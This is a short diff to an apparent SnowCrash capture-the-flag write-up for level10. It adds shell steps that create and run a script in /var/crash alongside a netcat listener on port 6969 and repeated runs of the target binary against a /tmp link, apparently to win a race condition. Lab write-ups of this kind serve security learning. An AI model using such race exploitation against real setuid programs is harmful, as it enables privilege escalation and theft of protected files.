@@ -39,8 +39,11 @@ level10@SnowCrash:~$ nc -kl 6969
 //we are listening on 6969 port
 
 Terminal 2:
-We create a script (cf script.sh) in /var/crash with +x rights
-/var/crash/script.sh &  // run in background
+We create a script (cf script.sh)
+level10@SnowCrash:~$ vim /var/crash/script.sh
+level10@SnowCrash:~$ chmod +x /var/crash/script.sh
+level10@SnowCrash:~$ /var/crash/script.sh &
+
 ./level10 /tmp/link 127.0.0.1 // may need several launch to adjust timing
 
 
